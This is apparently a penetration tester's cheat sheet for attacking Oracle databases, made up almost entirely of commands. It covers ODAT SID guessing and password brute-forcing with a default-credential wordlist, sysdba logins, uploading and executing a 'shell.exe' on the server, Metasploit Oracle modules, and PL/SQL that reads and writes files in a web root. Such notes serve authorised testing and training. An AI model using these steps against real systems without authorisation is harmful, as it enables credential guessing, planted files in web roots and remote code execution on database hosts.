# Oracle

> Oracle Database is a multi-model database management system produced and marketed by Oracle Corporation. It is a database commonly used for running online transaction processing, data warehousing and mixed database workloads.   
>
> -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Oracle_Database)</cite>

## General 

`sysdba` is like sudo


## ODAT

Oracle Database Attacking Tool  
[GitHub - quentinhardy/odat: ODAT](https://github.com/quentinhardy/odat)

### Guess sid (Oracle System ID)

```bash
odat.py sidguesser -s <ip> -p <port>
```

### Guess password (using sid)

```bash
/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
```
-> Replace ` ` by `/`

```bash
odat.py passwordguesser -d <sid> --accounts-file <file> -s <ip>
```

### Download/upload/delete files

```bash
./odat.py utlfile -s <ip> --sysdba -d XE -U <user> -P <password> --putFile /temp shell.exe ../shell.exe
```

### Read files or execute system commands/scripts
```bash
./odat.py externaltable -s <ip> --sysdba -d XE -U <user> -P <password> --exec /temp shell.exe
```

## SQL Plus

> **SQL Plus** is the most basic Oracle Database utility, with a basic command-line interface, commonly used by users, administrators, and programmers.  
>
> -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/SQL_Plus)</cite>


```bash
sqlplus <user>/<pass>@<ip>:<port>/<sid> as sysdba
```

## Metasploit

```bash
admin/oracle/sid_brute
```

```bash
admin/oracle/oracle_login
```

## File operations

### Read

```
declare 
	f utl_file.file_type;
	s varchar(200);
begin
	f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.html', 'R');
	utl_file.get_line(f, s);
	utl_file.close(f);
	dbms_output.put_line(s);
end;
```

Enable display of output
```bash
set serveroutput ON
```

Execute it
```bash
/
```

### Write

```
declare 
	f utl_file.file_type;
	s varchar(5000) := 'contents';
begin
	f := utl_file.fopen('/inetpub/wwwroot', 'file.txt', 'W');
	utl_file.put_line(f, s);
	utl_file.close(f);
	dbms_output.put_line(s);
end;
```

Execute it 
```bash
/
```

## Check privileges

```bash
select * from session_privs;
select * from user_role_privs;
```
